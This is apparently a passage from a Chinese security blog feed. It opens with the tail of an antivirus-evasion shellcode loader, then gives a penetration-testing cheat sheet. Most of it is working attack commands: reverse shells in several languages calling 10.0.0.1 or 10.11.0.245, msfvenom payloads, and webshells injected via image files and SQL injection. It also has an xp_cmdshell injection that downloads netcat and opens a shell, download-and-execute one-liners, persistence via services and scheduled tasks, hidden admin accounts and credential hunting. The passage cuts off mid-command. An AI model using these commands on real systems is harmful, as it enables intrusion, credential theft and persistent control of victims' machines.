1d\x60\xff&quot;&quot;\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13&quot;&quot;\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5&quot;;int main()&#123;    (*(void(*)())(&amp;goodcode))();&#125;</code></pre><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这种Shellcode的加载方式可以在编译时将Shellcode完全分配到<code>.text</code>段。此外将包含Shellcode的数组转换为函数指针并调用，从而避免了调用<code>CreateThread</code>之类的常用于跳转至Shellcode的Windows API。</p><p>这种方式可以有效避开一些杀毒软件的查杀。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> 后渗透 </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试速查表</title>
      <link href="/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2020/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><h3 id="存活IP扫描"><a href="#存活IP扫描" class="headerlink" title="存活IP扫描"></a>存活IP扫描</h3><pre><code class="shell">nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &gt; exposed-services-ips</code></pre><h3 id="批量Ping"><a href="#批量Ping" class="headerlink" title="批量Ping"></a>批量Ping</h3><pre><code class="shell">#!/bin/bashfor lastOctet in &#123;1..254&#125;; do     ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;done</code></pre><h3 id="单个端口检查"><a href="#单个端口检查" class="headerlink" title="单个端口检查"></a>单个端口检查</h3><pre><code class="shell">nc -v $TARGET 80telnet $TARGET 80curl -vX $TARGET</code></pre><h3 id="少量端口探测"><a href="#少量端口探测" class="headerlink" title="少量端口探测"></a>少量端口探测</h3><pre><code class="shell">for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done</code></pre><h3 id="nc端口扫描"><a href="#nc端口扫描" class="headerlink" title="nc端口扫描"></a>nc端口扫描</h3><pre><code class="shell">nc -nvv -w 1 -z host 1000-2000nc -nv -u -z -w 1 host 160-162</code></pre><h3 id="Masscan端口扫描"><a href="#Masscan端口扫描" class="headerlink" title="Masscan端口扫描"></a>Masscan端口扫描</h3><pre><code class="shell">masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0</code></pre><h3 id="DNS信息查询-子域名爆破"><a href="#DNS信息查询-子域名爆破" class="headerlink" title="DNS信息查询&#x2F;子域名爆破"></a>DNS信息查询&#x2F;子域名爆破</h3><pre><code class="shell">whois domain.comdig &#123;a|txt|ns|mx&#125; domain.comdig &#123;a|txt|ns|mx&#125; domain.com @ns1.domain.comhost -t &#123;a|txt|ns|mx&#125; megacorpone.comhost -a megacorpone.comhost -l megacorpone.com ns1.megacorpone.comdnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.comdnsenum domain.comnslookup -&gt; set type=any -&gt; ls -d domain.comfor sub in $(cat subdomains.txt);do host $sub.domain.com|grep &quot;has.address&quot;;done</code></pre><h3 id="NFS-Exported-Shares"><a href="#NFS-Exported-Shares" class="headerlink" title="NFS Exported Shares"></a>NFS Exported Shares</h3><pre><code class="shell">#列出NFS共享，如果存在&#39;rw,no_root_squash&#39;，可上传并执行sid-shellshowmount -e 192.168.110.102chown root:root sid-shell; chmod +s sid-shell</code></pre><h3 id="Kerberos枚举"><a href="#Kerberos枚举" class="headerlink" title="Kerberos枚举"></a>Kerberos枚举</h3><pre><code class="shell"># usersnmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39;</code></pre><h3 id="Web漏洞扫描（简易）"><a href="#Web漏洞扫描（简易）" class="headerlink" title="Web漏洞扫描（简易）"></a>Web漏洞扫描（简易）</h3><pre><code class="shell">target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobustertarget=10.0.0.1; nikto -h http://$target:80 | tee $target-niktotarget=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum</code></pre><h3 id="RPC-NetBios-SMB探测"><a href="#RPC-NetBios-SMB探测" class="headerlink" title="RPC&#x2F;NetBios&#x2F;SMB探测"></a>RPC&#x2F;NetBios&#x2F;SMB探测</h3><pre><code class="shell">rpcinfo -p $TARGETnbtscan $TARGET#list sharessmbclient -L //$TARGET -U &quot;&quot;# null sessionrpcclient -U &quot;&quot; $TARGETsmbclient -L //$TARGETenum4linux $TARGET</code></pre><h3 id="SNMP探测"><a href="#SNMP探测" class="headerlink" title="SNMP探测"></a>SNMP探测</h3><pre><code class="shell"># Windows User Accountssnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25# Windows Running Programssnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2# Windows Hostnamesnmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1# Windows Share Informationsnmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27# Windows TCP Portssnmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3# Software Namesnmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2# brute-force community stringsonesixtyone -i snmp-ips.txt -c community.txtsnmp-check $TARGET</code></pre><h3 id="SMTP探测"><a href="#SMTP探测" class="headerlink" title="SMTP探测"></a>SMTP探测</h3><pre><code class="shell">smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150</code></pre><h3 id="域信息探测"><a href="#域信息探测" class="headerlink" title="域信息探测"></a>域信息探测</h3><pre><code class="shell"># current domain info[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()# domain trusts([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# current forest info[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()# get forest trust relationships([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()# get DCs of a domainnltest /dclist:offense.localnet group &quot;domain controllers&quot; /domain# get DC for currently authenticated sessionnltest /dsgetdc:offense.local# get domain trusts from cmd shellnltest /domain_trusts# get user infonltest /user:&quot;spotless&quot;# get DC for currently authenticated sessionset l# get domain name and DC the user authenticated toklist# get all logon sessions. Includes NTLM authenticated sessionsklist sessions# kerberos tickets for the sessionklist# cached krbtgtklist tgt# whoami on older Windows systemsset u# find DFS shares with ADModuleGet-ADObject -filter * -SearchBase &quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot; | select name# find DFS shares with ADSI$s=[adsisearcher]&#39;(name=*)&#39;; $s.SearchRoot = [adsi]&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;; $s.FindAll() | % &#123;$_.properties.name&#125;# check if spooler service is running on a hostpowershell ls &quot;\\dc01\pipe\spoolss&quot;</code></pre><h3 id="Powershell下的端口监听"><a href="#Powershell下的端口监听" class="headerlink" title="Powershell下的端口监听"></a>Powershell下的端口监听</h3><pre><code class="powershell"># Start listener on port 443$listener = [System.Net.Sockets.TcpListener]443; $listener.Start(); while($true)&#123;    $client = $listener.AcceptTcpClient();    Write-Host $client.client.RemoteEndPoint &quot;connected!&quot;;    $client.Close();    start-sleep -seconds 1;&#125;</code></pre><h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><pre><code class="shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><pre><code class="shell">perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;#URL-Encoded Perl: Linuxecho%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew</code></pre><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre><code class="shell">php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre><code class="shell">ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</code></pre><h3 id="Netcat-without-e"><a href="#Netcat-without-e" class="headerlink" title="Netcat without -e"></a>Netcat without -e</h3><pre><code class="shell">#1rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f#2nc localhost 443 | /bin/sh | nc localhost 444</code></pre><h3 id="Telnet-Linux"><a href="#Telnet-Linux" class="headerlink" title="Telnet(Linux)"></a>Telnet(Linux)</h3><pre><code class="shell">telnet localhost 443 | /bin/sh | telnet localhost 444</code></pre><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre><code class="shell">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();</code></pre><h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><pre><code class="shell">xterm -display 10.0.0.1:1</code></pre><h3 id="非交互式shell升级"><a href="#非交互式shell升级" class="headerlink" title="非交互式shell升级"></a>非交互式shell升级</h3><pre><code class="shell">python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;/bin/busybox sh</code></pre><p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p><h2 id="JDWP-RCE"><a href="#JDWP-RCE" class="headerlink" title="JDWP RCE"></a>JDWP RCE</h2><pre><code class="shell">print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&quot;whoami&quot;).getInputStream())).readLine())</code></pre><p>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;]</p><h2 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h2><h3 id="msf生成有效载荷"><a href="#msf生成有效载荷" class="headerlink" title="msf生成有效载荷"></a>msf生成有效载荷</h3><pre><code class="shell">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai</code></pre><h3 id="Linux下编译c代码"><a href="#Linux下编译c代码" class="headerlink" title="Linux下编译c代码"></a>Linux下编译c代码</h3><pre><code class="shell"># Windowsi686-w64-mingw32-gcc source.c -lws2_32 -o out.exe# Linuxgcc -m32|-m64 -o output source.c</code></pre><h3 id="Windows下编译为-obj"><a href="#Windows下编译为-obj" class="headerlink" title="Windows下编译为.obj"></a>Windows下编译为.obj</h3><pre><code class="shell"># https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=Dnasm -f win64 .\hello.asm -o .\hello.obj# http://www.godevtool.com/Golink.zipGoLink.exe -o .\hello.exe .\hello.obj</code></pre><h3 id="py文件转换exe"><a href="#py文件转换exe" class="headerlink" title="py文件转换exe"></a>py文件转换exe</h3><pre><code class="shell">python pyinstaller.py --onefile convert-to-exe.py</code></pre><h3 id="生成有效载荷模式并计算偏移量"><a href="#生成有效载荷模式并计算偏移量" class="headerlink" title="生成有效载荷模式并计算偏移量"></a>生成有效载荷模式并计算偏移量</h3><pre><code class="shell">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE</code></pre><h2 id="WEB文件上传"><a href="#WEB文件上传" class="headerlink" title="WEB文件上传"></a>WEB文件上传</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>file.php -&gt; file.jpgfile.php -&gt; file.php.jpgfile.asp -&gt; file.asp;.jpgfile.gif (contains php code, but starts with string GIF/GIF98)00%file.jpg with php backdoor in exif (see below).jpg -&gt; proxy intercept -&gt; rename to .php</code></pre><h3 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h3><p>图片文件后门语句注入</p><pre><code class="shell">exiv2 -c&#39;A &quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;!&#39; backdoor.jpegexiftool “-comment&lt;=back.php” back.png</code></pre><h3 id="htaccess文件配置"><a href="#htaccess文件配置" class="headerlink" title=".htaccess文件配置"></a>.htaccess文件配置</h3><pre><code class="shell">#上传.htaccess文件将.blah文件解析为.php文件AddType application/x-httpd-php .blah</code></pre><h3 id="SQL注入上传WebShell"><a href="#SQL注入上传WebShell" class="headerlink" title="SQL注入上传WebShell"></a>SQL注入上传WebShell</h3><p>手工：</p><pre><code># Assumed 3 columnshttp://target/index.php?vulnParam=0&#39; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj</code></pre><p>SQLMap</p><pre><code class="shell"># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.sqlmap -r post-request -p item --level=3 --risk=2 --dbms=mysql --os-shell --threads 10</code></pre><p>NetCat(适用于xp_cmdshell可用的SQL Server)</p><pre><code class="shell"># netcat reverse shell via mssql injection when xp_cmdshell is available1000&#39;;+exec+master.dbo.xp_cmdshell+&#39;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&#39;;--</code></pre><h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><h3 id="hydra破解Web服务密码"><a href="#hydra破解Web服务密码" class="headerlink" title="hydra破解Web服务密码"></a>hydra破解Web服务密码</h3><pre><code class="shell">hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list</code></pre><h3 id="hydra破解通用协议口令"><a href="#hydra破解通用协议口令" class="headerlink" title="hydra破解通用协议口令"></a>hydra破解通用协议口令</h3><pre><code class="shell">hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1</code></pre><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><pre><code class="shell"># Bruteforce based on the pattern;hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  # Generate password candidates: wordlist + pattern;hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout# Generate NetNLTMv2 with internalMonologue and crack with hashcatInternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800# resulting hashspotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000# crack with hashcathashcat -m5600 &#39;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#39; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable</code></pre><h3 id="破解zip文件密码"><a href="#破解zip文件密码" class="headerlink" title="破解zip文件密码"></a>破解zip文件密码</h3><pre><code class="shell">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip</code></pre><h2 id="本地信息挖掘"><a href="#本地信息挖掘" class="headerlink" title="本地信息挖掘"></a>本地信息挖掘</h2><h3 id="寻找可读-写文件夹"><a href="#寻找可读-写文件夹" class="headerlink" title="寻找可读&#x2F;写文件夹"></a>寻找可读&#x2F;写文件夹</h3><pre><code class="powershell">$a = Get-ChildItem &quot;c:\windows\&quot; -recurse -ErrorAction SilentlyContinue$a | % &#123;    $fileName = $_.fullname    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? &#123;$_.filesystemrights -match &quot;full|modify|write&quot; -and $_.identityreference -match &quot;authenticated users|everyone|$env:username&quot;&#125;    if($acls -ne $null)    &#123;        [pscustomobject]@&#123;            filename = $fileName            user = $acls | select -exp identityreference        &#125;    &#125;&#125;</code></pre><h3 id="检查是否已启用Powershell日志记录"><a href="#检查是否已启用Powershell日志记录" class="headerlink" title="检查是否已启用Powershell日志记录"></a>检查是否已启用Powershell日志记录</h3><pre><code class="shell">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLoggingreg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</code></pre><h3 id="检查WinEvent日志中是否有SecureString"><a href="#检查WinEvent日志中是否有SecureString" class="headerlink" title="检查WinEvent日志中是否有SecureString"></a>检查WinEvent日志中是否有SecureString</h3><pre><code class="powershell">Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Microsoft-Windows-PowerShell/Operational&#39;; ID=4104&#125; | Select-Object -Property Message | Select-String -Pattern &#39;SecureString&#39;</code></pre><h3 id="检查WinEvent的机器唤醒-睡眠时间"><a href="#检查WinEvent的机器唤醒-睡眠时间" class="headerlink" title="检查WinEvent的机器唤醒&#x2F;睡眠时间"></a>检查WinEvent的机器唤醒&#x2F;睡眠时间</h3><pre><code class="pwoershell">Get-WinEvent -FilterHashTable @&#123; ProviderName = &#39;Microsoft-Windows-Power-TroubleShooter&#39;  ; Id = 1 &#125;|Select-Object -Property @&#123;n=&#39;Sleep&#39;;e=&#123;$_.Properties[0].Value&#125;&#125;,@&#123;n=&#39;Wake&#39;;e=&#123;$_.Properties[1].Value&#125;&#125;</code></pre><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><pre><code class="shell">#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftpservice atftpd start# Windowstftp -i $ATTACKER get /download/location/file /save/location/file</code></pre><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><pre><code class="shell"># Linux: set up ftp server with anonymous logon access;twistd -n ftp -p 21 -r /file/to/serve# Windows shell: read FTP commands from ftp-commands.txt non-interactively;echo open $ATTACKER&gt;ftp-commands.txtecho anonymous&gt;&gt;ftp-commands.txtecho whatever&gt;&gt;ftp-commands.txtecho binary&gt;&gt;ftp-commands.txtecho get file.exe&gt;&gt;ftp-commands.txtecho bye&gt;&gt;ftp-commands.txt ftp -s:ftp-commands.txt# Or just a one-liner(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd</code></pre><h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><pre><code class="shell">certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe</code></pre><h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http://10.11.0.245/nc.exe&#39;, &#39;C:\\Temp\\nc.exe&#39;)&quot;</code></pre><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><pre><code class="shell">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/file.exe&#39;,&#39;file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;file.exe&#39;);# download using default proxy credentials and launchpowershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;</code></pre><h3 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h3><pre><code class="shell">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code class="shell">wget http://$ATTACKER/filecurl http://$ATTACKER/file -Oscp ~/file/file.bin user@$TARGET:tmp/backdoor.py</code></pre><h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><pre><code class="shell"># Attackernc -l -p 4444 &lt; /tool/file.exe# Victimnc $ATTACKER 4444 &gt; file.exe</code></pre><h3 id="Windows-“debug-exe”-Method"><a href="#Windows-“debug-exe”-Method" class="headerlink" title="Windows “debug.exe” Method"></a>Windows “debug.exe” Method</h3><pre><code class="shell"># 1. In Linux, convert binary to hex ascii:wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt# 2. Paste nc.txt into Windows Shell.</code></pre><h3 id="Windows-BitsAdmin"><a href="#Windows-BitsAdmin" class="headerlink" title="Windows BitsAdmin"></a>Windows BitsAdmin</h3><pre><code class="shell">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe</code></pre><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="利用服务进行持久化"><a href="#利用服务进行持久化" class="headerlink" title="利用服务进行持久化"></a>利用服务进行持久化</h3><pre><code class="shell"># cmdsc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;# powersehllNew-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName &quot;&#39;C:\Program Files\NotEvil\back.exe&#39;&quot; -Description &quot;Not at all&quot;</code></pre><h3 id="创建持久化后门"><a href="#创建持久化后门" class="headerlink" title="创建持久化后门"></a>创建持久化后门</h3><pre><code class="shell"># Launch evil.exe every 10 minutesschtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe</code></pre><h3 id="创建用户并添加到本地管理员组"><a href="#创建用户并添加到本地管理员组" class="headerlink" title="创建用户并添加到本地管理员组"></a>创建用户并添加到本地管理员组</h3><pre><code class="shell">net user spotless spotless /add &amp; net localgroup Administrators spotless /add</code></pre><h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><pre><code class="shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /t REG_DWORD /v spotless /d 0 /f</code></pre><h3 id="利用服务配置错误进行提权"><a href="#利用服务配置错误进行提权" class="headerlink" title="利用服务配置错误进行提权"></a>利用服务配置错误进行提权</h3><pre><code class="shell"># Look for SERVICE_ALL_ACCESS in the outputaccesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;sc qc [service_name] (to verify!)sc start [service_name]</code></pre><h3 id="递归查找隐藏文件"><a href="#递归查找隐藏文件" class="headerlink" title="递归查找隐藏文件"></a>递归查找隐藏文件</h3><pre><code class="shell">dir /A:H /s &quot;c:\program files&quot;</code></pre><h3 id="检查文件-目录权限"><a href="#检查文件-目录权限" class="headerlink" title="检查文件&#x2F;目录权限"></a>检查文件&#x2F;目录权限</h3><pre><code class="shell">icacls.exe C:\folder /findsid userName-or-*sid /t//look for (F)ull, (M)odify, (W)rite</code></pre><h3 id="检查Windows存储的凭据"><a href="#检查Windows存储的凭据" class="headerlink" title="检查Windows存储的凭据"></a>检查Windows存储的凭据</h3><pre><code class="shell">c:\unattend.xmlc:\sysprep.infc:\sysprep\sysprep.xmldir c:\*vnc.ini /s /bdir c:\*ultravnc.ini /s /b dir c:\ /s /b | findstr /si *vnc.inifindstr /si password *.txt | *.xml | *.inifindstr /si pass *.txt | *.xml | *.inidir /s *cred* == *pass* == *.conf# Windows Autologonreg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;# VNCreg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;# Puttyreg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;# Registryreg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s</code></pre><h3 id="检查未注册（引用）的服务"><a href="#检查未注册（引用）的服务" class="headerlink" title="检查未注册（引用）的服务"></a>检查未注册（引用）的服务</h3><pre><code class="shell">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></pre><h3 id="开启进程"><a href="#开启进程" class="headerlink" title="开启进程"></a>开启进程</h3><h4 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code class="shell"># Requires PSRemoting$username = &#39;Administrator&#39;;$password = &#39;1234test&#39;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command &#123; whoami &#125;# without PSRemotingcmd&gt; powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;, (ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))# without PS Remoting, with argumentscmd&gt; powershell -command &quot;start-process cmd.exe -argumentlist &#39;/c calc&#39; -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;,(ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))&quot;</code></pre><h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><pre><code class="shell"># Requires interactive consolerunas /user:userName 